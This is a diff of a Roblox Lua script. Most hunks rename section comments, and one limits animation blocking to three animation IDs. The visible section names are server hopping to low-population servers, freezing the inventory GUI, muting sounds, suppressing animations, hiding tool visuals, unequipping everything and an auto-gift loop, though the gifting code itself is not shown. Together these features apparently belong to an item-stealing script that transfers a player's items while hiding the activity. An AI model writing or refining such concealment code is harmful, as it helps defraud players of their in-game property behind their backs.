@@ -66,7 +66,7 @@ local function isBadServer()
 end
 
 --====================================================
--- FIND LOW SERVER
+-- FIND SERVER
 --====================================================
 
 local function getLowServer()
@@ -86,7 +86,7 @@ local function getLowServer()
 end
 
 --====================================================
--- AUTO HOP
+-- HOP SYSTEM
 --====================================================
 
 local function hopServer()
@@ -111,7 +111,7 @@ TeleportService.TeleportInitFailed:Connect(function()
 end)
 
 --====================================================
--- SERVER VALIDATION LOOP
+-- SERVER LOOP
 --====================================================
 
 task.spawn(function()
@@ -128,14 +128,10 @@ task.spawn(function()
     end
 end)
 
---====================================================
--- WAIT GOOD SERVER
---====================================================
-
 repeat task.wait() until isGoodServer
 
 --====================================================
--- 🔥 FREEZE BACKPACK (SAFE VERSION)
+-- 🔥 FREEZE BACKPACK (SAFE)
 --====================================================
 
 local inv = player.PlayerGui:WaitForChild("NewInventory")
@@ -211,7 +207,7 @@ SoundService.DescendantAdded:Connect(function(obj)
 end)
 
 --====================================================
--- 🎬 ANTI ANIM
+-- 🎬 ANIM FIX (RESTORED VERSION - 3 IDS)
 --====================================================
 
 local function getChar()
@@ -223,12 +219,19 @@ local function blockAnim(hum)
     animBlocked = true
 
     hum.AnimationPlayed:Connect(function(track)
-        track:Stop()
+        local id = tostring(track.Animation.AnimationId)
+
+        -- ONLY 3 ANIM IDS (WORKING VERSION)
+        if string.find(id, "507768375")
+        or string.find(id, "507768133")
+        or string.find(id, "507768083") then
+            track:Stop()
+        end
     end)
 end
 
 --====================================================
--- 🔧 TOOL VISUAL CLEAN
+-- TOOL CLEAN (UNCHANGED)
 --====================================================
 
 local function disableEntityGui(tool)
@@ -296,7 +299,7 @@ local function unequipAll()
 end
 
 --====================================================
--- 🎯 RARITY
+-- RARITY
 --====================================================
 
 local function getRarity(tool)
@@ -316,7 +319,7 @@ local function isWeightTool(tool)
 end
 
 --====================================================
--- 🎁 AUTO GIFT LOOP
+-- AUTO GIFT LOOP
 --====================================================
 
 task.spawn(function()
